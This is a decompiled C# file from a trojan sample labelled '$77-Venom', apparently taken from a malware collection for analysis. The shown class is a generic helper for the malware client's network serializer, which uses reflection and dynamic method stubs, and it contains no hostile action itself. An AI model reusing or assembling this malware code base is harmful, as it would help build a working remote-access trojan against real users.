// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.Helpers
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;

namespace xClient.Core.NetSerializer
{
  internal static class Helpers
  {
    public static readonly ConstructorInfo ExceptionCtorInfo = typeof (Exception).GetConstructor(BindingFlags.Instance | BindingFlags.Public, (Binder) null, new Type[0], (ParameterModifier[]) null);

    public static IEnumerable<FieldInfo> GetFieldInfos(Type type)
    {
      IOrderedEnumerable<FieldInfo> second = ((IEnumerable<FieldInfo>) type.GetFields(BindingFlags.DeclaredOnly | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic)).Where<FieldInfo>((Func<FieldInfo, bool>) (fi => (fi.Attributes & FieldAttributes.NotSerialized) == FieldAttributes.PrivateScope)).OrderBy<FieldInfo, string>((Func<FieldInfo, string>) (f => f.Name), (IComparer<string>) StringComparer.Ordinal);
      return type.BaseType == (Type) null ? (IEnumerable<FieldInfo>) second : Helpers.GetFieldInfos(type.BaseType).Concat<FieldInfo>((IEnumerable<FieldInfo>) second);
    }

    public static DynamicMethod GenerateDynamicSerializerStub(Type type)
    {
      DynamicMethod dynamicSerializerStub = new DynamicMethod("Serialize", (Type) null, new Type[3]
      {
        typeof (Serializer),
        typeof (Stream),
        type
      }, typeof (Serializer), true);
      dynamicSerializerStub.DefineParameter(1, ParameterAttributes.None, "serializer");
      dynamicSerializerStub.DefineParameter(2, ParameterAttributes.None, "stream");
      dynamicSerializerStub.DefineParameter(3, ParameterAttributes.None, "value");
      return dynamicSerializerStub;
    }

    public static DynamicMethod GenerateDynamicDeserializerStub(Type type)
    {
      DynamicMethod deserializerStub = new DynamicMethod("Deserialize", (Type) null, new Type[3]
      {
        typeof (Serializer),
        typeof (Stream),
        type.MakeByRefType()
      }, typeof (Serializer), true);
      deserializerStub.DefineParameter(1, ParameterAttributes.None, "serializer");
      deserializerStub.DefineParameter(2, ParameterAttributes.None, "stream");
      deserializerStub.DefineParameter(3, ParameterAttributes.Out, "value");
      return deserializerStub;
    }
  }
}
